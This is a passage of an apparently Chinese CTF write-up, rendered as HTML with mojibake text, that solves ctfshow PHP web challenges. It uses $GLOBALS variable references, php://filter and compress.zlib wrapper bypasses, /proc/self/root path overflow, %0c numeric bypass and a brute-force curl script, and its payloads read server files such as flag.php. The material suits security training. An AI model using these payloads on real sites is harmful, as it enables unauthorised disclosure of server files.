|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">getFlag</span>(<span class="variable">$v1</span>,<span class="variable">$v2</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æƒ³è¦æ‰§è¡Œgetflagå‡½æ•°ï¼Œé‚£ä¹ˆv1å¿…é¡»ä¸º<code>ctfshow</code>ï¼Œv2èµ‹å€¼ä¸º<code>GLOBALS</code>ï¼Œè¿™é‡Œè¿ç”¨åˆ°äº†å…¨å±€å˜é‡ã€‚<br>ç„¶åå†å°†v2çš„å€¼èµ‹ç»™v1ï¼Œå†æ¥ç€getFlagå‡½æ•°ï¼Œæ‰“å°v1ï¼Œv1ä¸ºå…¨å±€å˜é‡çš„æ—¶å€™ï¼Œå³å¯æ‰“å°å‡ºflag<br>å®åœ¨æ²¡çœ‹æ‡‚ï¼Œæˆ‘ä»¬çœ‹çœ‹ä»¥ä¸‹è§£é‡Šï¼š<br>å‡è®¾ç°åœ¨æœ‰ä»¥ä¸‹ä¸¤ä¸ªå˜é‡ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$v1</span> = <span class="string">&#x27;foo&#x27;</span>;  <span class="comment">// $v1 çš„å€¼ä¸ºå­—ç¬¦ä¸² &#x27;foo&#x27;</span></span><br><span class="line"><span class="variable">$v2</span> = <span class="string">&#x27;bar&#x27;</span>;  <span class="comment">// $v2 çš„å€¼ä¸ºå­—ç¬¦ä¸² &#x27;bar&#x27;</span></span><br><span class="line"><span class="variable">$bar</span> = <span class="string">&#x27;i am bar&#x27;</span>;</span><br></pre></td></tr></table></figure><p>ç°åœ¨è°ƒç”¨ <code>getFlag</code> å‡½æ•°ï¼Œå¹¶å°† <code>$v1</code> å’Œ <code>$v2</code> ä½œä¸ºå¼•ç”¨å‚æ•°ä¼ é€’ç»™å®ƒï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">getFlag</span>(<span class="variable">$v1</span>, <span class="variable">$v2</span>);</span><br></pre></td></tr></table></figure><p>åœ¨å‡½æ•°å†…éƒ¨ï¼Œ<code>&quot;$$v1 = &amp;$$v2;&quot;</code> è¿™ä¸€è¡Œä»£ç å°†æŠŠ <code>$v2</code> çš„å¼•ç”¨èµ‹å€¼ç»™äº†ä»¥ <code>$v1</code> å˜é‡çš„å€¼ <code>&#39;foo&#39;</code> ä½œä¸ºå˜é‡åçš„æ–°å˜é‡ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨å‡½æ•°æ‰§è¡Œå®Œæ¯•åï¼Œæˆ‘ä»¬å¾—åˆ°äº†å¦ä¸€ä¸ªå˜é‡ <code>$foo</code>ï¼Œå®ƒæŒ‡å‘äº†å’Œ <code>$bar</code> ç›¸åŒçš„å†…å­˜åœ°å€ã€‚<br>å› æ­¤ï¼Œå¦‚æœæˆ‘ä»¬åœ¨è°ƒç”¨ <code>getFlag</code> å‡½æ•°ä¹‹åè¾“å‡º <code>$foo</code> å˜é‡çš„å€¼ï¼Œåº”è¯¥ä¼šå¾—åˆ° <code>$bar</code>çš„å€¼ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$foo</span>);  <span class="comment">// è¾“å‡º string(8) &quot;i am bar&quot;</span></span><br></pre></td></tr></table></figure><p>æµ‹è¯•å¦‚ä¸‹ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1684337748600-cf869928-8df9-4731-ac96-582deef8fea3.png" alt="image.png"><br>PSï¼šbydæˆ‘æœ€å¼€å§‹è¿˜è®©gptå¿½æ‚ äº†ï¼Œåæ¥ååº”è¿‡æ¥äº†ï¼Œæ”¹å›æ¥äº†ã€‚å†æé†’ä¸€ä¸‹ï¼Œä¸è¦å¿˜è®°ç¼–ç¨‹è¯­è¨€çš„åŸºç¡€ï¼Œ<code>=</code>æ˜¯èµ‹å€¼ï¼Œä¸æ˜¯å–ç­‰ï¼</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params">&amp;<span class="variable">$v1</span>,&amp;<span class="variable">$v2</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;$<span class="subst">$v1</span> = &amp;$<span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$$v1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$v1</span> = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="variable">$v2</span> = <span class="string">&#x27;GLOBALS&#x27;</span>;</span><br><span class="line"><span class="variable">$$v1</span> = &amp;<span class="variable">$$v2</span>;</span><br><span class="line"><span class="title function_ invoke__">getFlag</span>(<span class="variable">$v1</span>,<span class="variable">$v2</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å’ŒæŒ‡é’ˆç±»ä¼¼ï¼Œç¨å¾®ç†ä¸€ä¸‹ï¼Œä¹Ÿå°±æ˜¯$aç»™äºˆäº†å’Œ$GLOBALSç›¸åŒçš„è¶…å…¨å±€å˜é‡ã€‚æœ€åvardumpçš„æ˜¯$aã€‚</p><h2 id="å¤‡æ³¨"><a href="#å¤‡æ³¨" class="headerlink" title="å¤‡æ³¨"></a>å¤‡æ³¨</h2><p>globalå’Œ$GLOBALSï¼š<a href="https://www.php.cn/php-weizijiaocheng-369541.html">https://www.php.cn/php-weizijiaocheng-369541.html</a></p><h1 id="web112"><a href="#web112" class="headerlink" title="web112"></a>web112</h1><h3 id="è€ƒç‚¹ï¼šphpä¼ªåè®®ç»•è¿‡is-file-highlight-file-å¯¹äºphpä¼ªåè®®çš„ä½¿ç”¨"><a href="#è€ƒç‚¹ï¼šphpä¼ªåè®®ç»•è¿‡is-file-highlight-file-å¯¹äºphpä¼ªåè®®çš„ä½¿ç”¨" class="headerlink" title="è€ƒç‚¹ï¼šphpä¼ªåè®®ç»•è¿‡is_file+highlight_file  å¯¹äºphpä¼ªåè®®çš„ä½¿ç”¨"></a>è€ƒç‚¹ï¼šphpä¼ªåè®®ç»•è¿‡is_file+highlight_file  å¯¹äºphpä¼ªåè®®çš„ä½¿ç”¨</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">function <span class="built_in">filter</span>($file)&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\.\.\/|http|https|data|input|rot13|base64|string/i&#x27;</span>,$file))&#123;</span><br><span class="line">        die(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! is_file($file))&#123;</span><br><span class="line">    highlight_file(<span class="built_in">filter</span>($file));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    echo <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥ç›´æ¥è¯»æ–‡ä»¶<code>?file=php://filter/resource=flag.php</code><br>é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜æœ‰å‡ ç§ç‰¹æ®Šçš„ç¼–ç æ–¹å¼<br><code>file=php://filter/read=convert.quoted-printable-encode/resource=flag.php</code>ï¼ˆè¿™ä¸ªä¹‹å‰æ²¡è§è¿‡ï¼Œæ³¨æ„ä¸€ä¸‹ï¼‰<br><code>file=compress.zlib://flag.php</code><br><code>php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php</code></p><h1 id="web113"><a href="#web113" class="headerlink" title="web113"></a>web113</h1><blockquote><p><a href="https://www.cnblogs.com/meng-han/p/16803560.html#:~:text=ctfshow%20web112%20%28%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87is_file%E5%87%BD%E6%95%B0%29%20%24file%20%3D%20%24_GET%20%5B%20%27file%27,%7D%20else%20%7B%20echo%20%22hacker%21%22%20%3B%20%7D%20%E8%BF%99%E9%87%8C%E7%9A%84is_file%E5%87%BD%E6%95%B0%EF%BC%8C%E5%9C%A8%E4%BD%BF%E7%94%A8php%E7%9A%84%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%97%B6%E5%80%99%E4%BC%9A%E8%BF%94%E5%9B%9Efalse%EF%BC%8C%E9%99%A4%E4%BA%86file%3A%2F%2F%E5%8D%8F%E8%AE%AE%E4%BB%A5%E5%A4%96%E3%80%82">https://www.cnblogs.com/meng-han/p/16803560.html#:~:text=ctfshow%20web112%20%28%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87is_file%E5%87%BD%E6%95%B0%29%20%24file%20%3D%20%24_GET%20%5B%20%27file%27,%7D%20else%20%7B%20echo%20%22hacker%21%22%20%3B%20%7D%20%E8%BF%99%E9%87%8C%E7%9A%84is_file%E5%87%BD%E6%95%B0%EF%BC%8C%E5%9C%A8%E4%BD%BF%E7%94%A8php%E7%9A%84%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%97%B6%E5%80%99%E4%BC%9A%E8%BF%94%E5%9B%9Efalse%EF%BC%8C%E9%99%A4%E4%BA%86file%3A%2F%2F%E5%8D%8F%E8%AE%AE%E4%BB%A5%E5%A4%96%E3%80%82</a></p></blockquote><h3 id="è€ƒç‚¹ï¼šç›®å½•æº¢å‡º"><a href="#è€ƒç‚¹ï¼šç›®å½•æº¢å‡º" class="headerlink" title="è€ƒç‚¹ï¼šç›®å½•æº¢å‡º"></a>è€ƒç‚¹ï¼šç›®å½•æº¢å‡º</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">function <span class="built_in">filter</span>($file)&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/filter|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,$file))&#123;</span><br><span class="line">        die(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! is_file($file))&#123;</span><br><span class="line">    highlight_file(<span class="built_in">filter</span>($file));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    echo <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>?file=compress.zlib://flag.php</code><br>é™¤æ­¤ä¹‹å¤–ï¼Œæœ‰ä¸ªé¢„æœŸè§£ï¼š<code>?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</code><br>åœ¨linuxä¸­/proc/self/rootæ˜¯æŒ‡å‘æ ¹ç›®å½•çš„ï¼Œä¹Ÿå°±æ˜¯å¦‚æœåœ¨å‘½ä»¤è¡Œä¸­è¾“å…¥ls /proc/self/rootï¼Œå…¶å®æ˜¾ç¤ºçš„å†…å®¹æ˜¯æ ¹ç›®å½•ä¸‹çš„å†…å®¹ã€‚<br>åŸç†ï¼šis_fileå‡½æ•°èƒ½å¤„ç†çš„é•¿åº¦æœ‰é™,ç”¨/proc/self/rootå¯ä»¥ç›®å½•æº¢å‡º</p><h1 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">function <span class="built_in">filter</span>($file)&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,$file))&#123;</span><br><span class="line">        die(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">echo <span class="string">&quot;å¸ˆå‚…ä»¬å±…ç„¶tqléƒ½æ˜¯éé¢„æœŸ å“¼ï¼&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(! is_file($file))&#123;</span><br><span class="line">    highlight_file(<span class="built_in">filter</span>($file));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    echo <span class="string">&quot;hacker!&quot;</span>;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªç›´æ¥ä½¿ç”¨<code>?file=php://filter/resource=flag.php</code>å°±è¡Œ</p><h1 id="web115"><a href="#web115" class="headerlink" title="web115"></a>web115</h1><h3 id="è€ƒç‚¹ï¼štrimå‡½æ•°çš„ç»•è¿‡-is-numericç»•è¿‡"><a href="#è€ƒç‚¹ï¼štrimå‡½æ•°çš„ç»•è¿‡-is-numericç»•è¿‡" class="headerlink" title="è€ƒç‚¹ï¼štrimå‡½æ•°çš„ç»•è¿‡+is_numericç»•è¿‡"></a>è€ƒç‚¹ï¼štrimå‡½æ•°çš„ç»•è¿‡+is_numericç»•è¿‡</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">include(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">function <span class="built_in">filter</span>($num)&#123;</span><br><span class="line">    $num=str_replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;1&quot;</span>,$num);</span><br><span class="line">    $num=str_replace(<span class="string">&quot;0&quot;</span>,<span class="string">&quot;1&quot;</span>,$num);</span><br><span class="line">    $num=str_replace(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;1&quot;</span>,$num);</span><br><span class="line">    $num=str_replace(<span class="string">&quot;e&quot;</span>,<span class="string">&quot;1&quot;</span>,$num);</span><br><span class="line">    $num=str_replace(<span class="string">&quot;+&quot;</span>,<span class="string">&quot;1&quot;</span>,$num);</span><br><span class="line">    <span class="keyword">return</span> $num;</span><br><span class="line">&#125;</span><br><span class="line">$num=$_GET[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(is_numeric($num) <span class="keyword">and</span> $num!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> trim($num)!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="built_in">filter</span>($num)==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>($num==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        echo <span class="string">&quot;hacker!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    echo <span class="string">&quot;hacker!!!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="trimå‡½æ•°"><a href="#trimå‡½æ•°" class="headerlink" title="trimå‡½æ•°"></a>trimå‡½æ•°</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">è¯­æ³•</span><br><span class="line">trim(string,charlist)</span><br><span class="line"></span><br><span class="line">å‚æ•°        æè¿°</span><br><span class="line">string        å¿…éœ€ã€‚è§„å®šè¦æ£€æŸ¥çš„å­—ç¬¦ä¸²ã€‚</span><br><span class="line">charlist    å¯é€‰ã€‚è§„å®šä»å­—ç¬¦ä¸²ä¸­åˆ é™¤å“ªäº›å­—ç¬¦ã€‚å¦‚æœçœç•¥è¯¥å‚æ•°ï¼Œåˆ™ç§»é™¤ä¸‹åˆ—æ‰€æœ‰å­—ç¬¦ï¼š</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\0&quot;</span>       - NULL</span><br><span class="line"><span class="string">&quot;\t&quot;</span>       - åˆ¶è¡¨ç¬¦</span><br><span class="line"><span class="string">&quot;\n&quot;</span>       - æ¢è¡Œ</span><br><span class="line"><span class="string">&quot;\x0B&quot;</span>     - å‚ç›´åˆ¶è¡¨ç¬¦</span><br><span class="line"><span class="string">&quot;\r&quot;</span>       - å›è½¦</span><br><span class="line"><span class="string">&quot; &quot;</span>        - ç©ºæ ¼</span><br></pre></td></tr></table></figure><p>æµ‹è¯•ç¨‹åºï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt;=<span class="number">128</span> ; $i++) &#123;</span><br><span class="line">$x=<span class="built_in">chr</span>($i).<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(trim($x)!==<span class="string">&#x27;1&#x27;</span> &amp;&amp;  is_numeric($x))&#123;</span><br><span class="line">echo urlencode(<span class="built_in">chr</span>($i)).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‘ç°é™¤äº†+-.å·ä»¥å¤–è¿˜æœ‰åªå‰©ä¸‹%0cä¹Ÿå°±æ˜¯æ¢é¡µç¬¦äº†ï¼Œæ‰€ä»¥è¿™ä¸ªé¢˜åªæœ‰è¿™ä¸€ä¸ªå›ºå®šçš„è§£äº†ã€‚<br><code>num=%0c36</code></p><h1 id="web123ã€web125ã€web126"><a href="#web123ã€web125ã€web126" class="headerlink" title="*web123ã€web125ã€web126"></a>*web123ã€web125ã€web126</h1><blockquote><p><a href="https://blog.csdn.net/miuzzx/article/details/109181768">https://blog.csdn.net/miuzzx/article/details/109181768</a></p></blockquote><h3 id="è€ƒç‚¹ï¼šphpå˜é‡ä¸å…è®¸å‡ºç°-ä¼ å…¥-ä»£æ›¿-SERVER-â€˜argvâ€™"><a href="#è€ƒç‚¹ï¼šphpå˜é‡ä¸å…è®¸å‡ºç°-ä¼ å…¥-ä»£æ›¿-SERVER-â€˜argvâ€™" class="headerlink" title="è€ƒç‚¹ï¼šphpå˜é‡ä¸å…è®¸å‡ºç°. ä¼ å…¥[ä»£æ›¿_ $_SERVER[â€˜argvâ€™]"></a>è€ƒç‚¹ï¼šphpå˜é‡ä¸å…è®¸å‡ºç°. ä¼ å…¥[ä»£æ›¿_ $_SERVER[â€˜argvâ€™]</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">$a=$_SERVER[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line">$c=$_POST[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(isset($_POST[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;isset($_POST[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!isset($_GET[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?/&quot;</span>, $c)&amp;&amp;$c&lt;=<span class="number">18</span>)&#123;</span><br><span class="line">         <span class="built_in">eval</span>(<span class="string">&quot;$c&quot;</span>.<span class="string">&quot;;&quot;</span>);  </span><br><span class="line">         <span class="keyword">if</span>($fl0g===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             echo $flag;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªé—®é¢˜æ˜¯phpå˜é‡åæ˜¯ä¸å…è®¸ç‚¹çš„ä½¿ç”¨çš„ï¼š<br>æ¯”å¦‚å¯ä»¥æµ‹è¯•ä¸€ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">var_dump($_POST);</span><br><span class="line"></span><br><span class="line">è¾“å…¥ CTF_SHOW.COM=<span class="number">1</span></span><br><span class="line">è¿”å›</span><br><span class="line">array(<span class="number">1</span>) &#123; [<span class="string">&quot;CTF_SHOW_COM&quot;</span>]=&gt; string(<span class="number">1</span>) <span class="string">&quot;1&quot;</span> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688182650580-e505632b-147a-4bc7-8dbd-d8b01aa593fd.png" alt="image.png"><br>å¦å¤–æœ‰ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼Œä½¿ç”¨<code>[</code>æ¥ä»£æ›¿ä¸‹åˆ’çº¿ï¼Œå…·ä½“åŸå› æœªçŸ¥ï¼Œçˆ†ç ´è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$url</span>,<span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">  <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>(); </span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_POST, <span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_POSTFIELDS, <span class="variable">$data</span>);</span><br><span class="line"><span class="variable">$response</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$response</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$url</span>=<span class="string">&quot;http://127.0.0.1/test.php&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt;=<span class="number">128</span> ; <span class="variable">$i</span>++) &#123; </span><br><span class="line">  <span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;=<span class="number">128</span> ; <span class="variable">$j</span>++) &#123;</span><br><span class="line">    <span class="variable">$data</span>=<span class="string">&quot;CTF&quot;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>)).<span class="string">&quot;SHOW&quot;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$j</span>)).<span class="string">&quot;COM&quot;</span>.<span class="string">&quot;=123&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">curl</span>(<span class="variable">$url</span>,<span class="variable">$data</span>)!=<span class="number">0</span>)&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="variable">$data</span>.<span class="string">&quot;\n&quot;</span>; </span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>test.php:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span>(isset($_POST[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>]))&#123;</span><br><span class="line">    echo <span class="number">123</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¾“å‡ºç»“æœ<br><code>CTF%5BSHOW.COM=123</code><br>å¦å¤–</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>ã€cliæ¨¡å¼ï¼ˆå‘½ä»¤è¡Œï¼‰ä¸‹</span><br><span class="line"></span><br><span class="line">ç¬¬ä¸€ä¸ªå‚æ•°$_SERVER[<span class="string">&#x27;argv&#x27;</span>][<span 